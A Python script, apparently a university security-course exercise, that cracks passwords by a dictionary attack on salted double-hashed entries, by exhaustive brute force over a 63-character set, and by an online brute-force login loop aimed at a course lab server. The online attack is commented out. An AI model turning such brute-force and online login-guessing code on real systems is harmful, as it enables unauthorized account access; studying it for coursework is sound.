import hashlib
import os
import sys
from requests import Session
from bs4 import BeautifulSoup as bs
import time


# DICTIONARY
def splitFile1():
    user, salt_value, hash_value = ([] for i in range(3))
    with open("foreals2.txt", "r") as data_file:
        lines = data_file.readlines()[2:]
        for l in lines:
            data = l.strip().split(',')
            print(data)
            user.append(data[0])
            salt_value.append(data[1])
            hash_value.append(data[2])
    return user, salt_value, hash_value


def dictionary(user, salt_value, hash_value):
    
    a_file = open("wordList.txt", "r")
    
    for w in a_file:
        wordSalt = w.strip() + salt_value.strip() # microbiologies + salt
        
        encPass = wordSalt.encode()
        digest = hashlib.sha256(encPass.strip()).hexdigest()
        encPass1 = digest.encode()
        digest1 = hashlib.sha1(encPass1.strip()).hexdigest()
        
        if hash_value.strip() == digest1:
            print("Password: " + w + "for username: " + user.strip())
            return
        
        if w == "zyzzyvas":
            return


# RANDOM     
def splitFile2():
    user, hash_value = ([] for i in range(2))
    with open("foreals2.txt", "r") as data_file:
        lines = data_file.readlines()[2:]
        for l in lines:
            data = l.strip().split(',')
            print(data)
            user.append(data[0])
            hash_value.append(data[1])
    return user, hash_value


def passwords(allowed, i, s, user, hash_value):
    if (i == -1):
        print(s)
        encPass = s.encode()
        digest = hashlib.sha256(encPass.strip()).hexdigest()
        encPass1 = digest.encode()
        digest1 = hashlib.sha1(encPass1.strip()).hexdigest()
        if hash_value.strip() == digest1:
            print("Password: " , s , "Username:" , user)
            end = time.time()
            print("Time:", end - start)
        return
    for j in range(0, 63):
        new_s = s + allowed[j]
        passwords(allowed, i - 1, new_s, user, hash_value)
    return


def random(allowed, user, hash_value):
    for i in range(0 , 10):
        passwords(allowed, i, "", user, hash_value)


# ONLINE
def passwords2(allowed, i, s):
    if (i == -1):
        print(s)
        with Session() as k:
            site = k.get("https://cssrvlab01.utep.edu/Classes/cs5339/longpre/cs5352/loginScreen.php")
            bs_content = bs(site.content, "html.parser")
            #token = bs_content.find("input", {"name":"csrf_token"})["value"]
            login_data = {"Username":"jonathan37_-uLQ","Password":s}
            k.post("https://cssrvlab01.utep.edu/Classes/cs5339/longpre/cs5352/loginScreen.php",login_data)
        return
    for j in range(0, 26):
        new_s = s + allowed[j]
        passwords2(allowed, i - 1, new_s)
    return


def online(allowed):
    for i in range(1 , 2):
        passwords2(allowed, i, "")


if __name__ == '__main__':
    #user, salt_value, hash_value = splitFile1()
    #for i in range(10):
    #    dictionary(user[i], salt_value[i], hash_value[i])
    
    
    allowed1 = ['-', '_', '1', '2', '3','4', '5', '6', '7', '8', '9',
               'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
               'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
               'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
               'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    user, hash_value = splitFile2()
    for i in range(10):
        start = time.time()
        random(allowed1, user[i], hash_value[i])
    #start = time.time()
    #random(allowed1, user[0], hash_value[0])
    
    allowed2 = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
                'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    #online(allowed2)
